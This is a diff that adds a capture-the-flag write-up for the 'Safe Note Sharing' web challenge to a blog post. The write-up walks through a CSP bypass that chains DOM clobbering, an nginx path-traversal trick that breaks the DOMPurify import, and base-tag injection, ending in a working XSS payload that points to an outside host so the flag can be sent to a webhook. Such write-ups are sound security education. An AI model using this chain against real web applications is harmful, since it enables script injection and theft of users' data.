@@ -14,6 +14,7 @@ tags:
 lightgallery: true
 toc:
   enable: true
+lastmod: 2024-07-19T16:54:32+03:00
 ---
 ## Introduction
 
@@ -106,4 +107,95 @@ GG
 
 ## "Safe Note Sharing" (600 Pts)
 
-THE WRITEUP IS READY, I'M WAITING FOR THE CREATORS PERMISSIONS TO UPLOAD IT.
+It's quite common to see these note apps challenges in CTF competitions, and the "Safe Note Sharing" chall made by Dor Konis and Amit Laish was a crazy well made one!
+
+![image](../Pasted%20image%2020240628095645.png)
+
+I began by accessing the web application to explore its functionalities, And I saw that users could create notes, contact an administrator to check note URLs, and access the source code for further examination.
+![image](../Pasted%20image%2020240628101222.png)
+
+It became apparent that the challenge involved XSS (Cross-Site Scripting).
+Additionally, I observed the presence of a Content Security Policy (CSP) in the response headers:
+
+![image](../Pasted%20image%2020240628101401.png)
+
+![image](../Pasted%20image%2020240628101750.png)
+After analyzing it with the CSP Evaluator, we noticed that the base URL was absent, potentially indicating vulnerability to Base tag injection. This injection could alter the base URL for scripts, such as `./script.js` will become `evil.com/script.js`.
+
+After downloading the source code, we can see that this app is a node app that can be deployed locally with docker, although such deployment was unnecessary for this challenge.
+![image](../Pasted%20image%2020240628102437.png)
+
+In the `support.mjs` file, it was observed that when the `/api/support/sendURL` endpoint receives a POST request, a Chromium instance is launched to access the provided URL:
+
+![image](../Pasted%20image%2020240628103110.png)
+And there's a `/api/support/flag` endpoint that needs to be accessed via the staff browser:
+
+![image](../Pasted%20image%2020240628103349.png)
+So now, our goal is to get an XSS that will be executed in the note that the staff has opened.
+lets try to send him a note with a simple `<script>alert(1)<script>`
+
+![image](../Pasted%20image%2020240628103557.png)
+
+![image](../Pasted%20image%2020240628103618.png)
+
+![image](../Pasted%20image%2020240628103657.png)
+It's here, but It'll not be executed because of the CSP (script-src 'strict-dynamic') which allows loading scripts from any source if it has been whitelisted by a nonce or hash.
+
+now lets examine the html more, because there is an interesting script there:
+![image](../Pasted%20image%2020240628104100.png)
+In this script, it verifies if the user's origin is `http://localhost`. If true, it proceeds to sanitize the input and insert it into the `displayElement` HTML. If sanitization fails, it loads the `./logger.js` script and logs the error.
+
+so maybe we can preform a DOM Clobbering here to cause an error and then clobber the loggerScript to load our own script!
+
+Step No.1 is get inside the if statement: `<a id=isDevelopment href=hi>`
+with this payload we can give `isDeveploment` a value and actually get inside the if statement:
+![image](../Pasted%20image%2020240628105803.png)
+
+In step 2, our objective is to either bypass DOMPurify's sanitize function or disrupt the second line of the process. After extensive research, it became clear that the only viable approach to achieve this goal is to get `DOMPurify.sanitize()` to be an unknown function and object.
+
+and we can achieve that by firstly look at how dompurify.js is being imported:
+![image](../Pasted%20image%2020240628110509.png)
+we can see that it is imported with `./dompurify.js` which is a bit weird to me... because when you want to import DOMPurify you import it with a url like: `https://cdn.jsdelivr.net/npm/dompurify@2.3.3/dist/purify.min.js`
+
+There is another way to cause an error, which is to import `./dompurify.js` the wrong way, because now it imports it like: `https://bstlv24-safenotesharing.chals.io/dompurify.js`
+but what if we manipulate the url so that It'll look the same, and get you to the same page, but the imports will not be loaded.
+![image](../Pasted%20image%2020240628113046.png)
+
+After looking at that `nginx.conf` file, we can see a misconfiguration in how requests to the root `/` and `/api` paths are handled. Specifically, the use of `try_files $uri $uri/ =404;` for the root path `/` could expose files to unintended access, which potentially will become a URL manipulation attack.
+
+so we can break the try by appending `/api/..%2f` to the URL and trick the server into fetching `./dompurify.js` from a different context, that will make the `DOMPurify.sanitize()` break because this is not exist.
+
+![image](../Pasted%20image%2020240628115431.png)
+and yes, it is broken!
+
+![image](../Pasted%20image%2020240628115829.png)
+
+Now we got into this place of the code that loads the `./logger.js` script and we need to find a way how can we get it to be our `evil.com/logger.js` script....
+Ummmm.. that reminds me of something! Remember the results from the CSP Evaluator?
+I'll remind you them:
+![image](../Pasted%20image%2020240628101750.png)
+
+we have the Base Tag Injection which can change the base url of the `logger.js` script.
+so that means we can change it to whatever I want and run js on the client (aka XSS)!
+
+lets make our final payload that will clobber isDevelopment and change the base url:
+
+`/api/..%2F?note=<base id="isDevelopment" href="https://x55.is/">
+
+and YAY we got XSS:
+![image](../Pasted%20image%2020240628121006.png)
+
+no we need to make a script that our webhook will send that will fetch the `/api/support/flag` endpoint and send us the response from it:
+
+![image](../Pasted%20image%2020240628122230.png)
+
+I made this function that will fetch the `/api/support/flag` endpoint and send us the response from it:
+
+I've loaded the script at the webhook site, and placed the note url in the contact support page:
+![image](../Pasted%20image%2020240628122412.png)
+
+and we got the flag at the webhook!!!!!
+
+![image](../Pasted%20image%2020240628122447.png)
+
+That was a very great web challenge :)
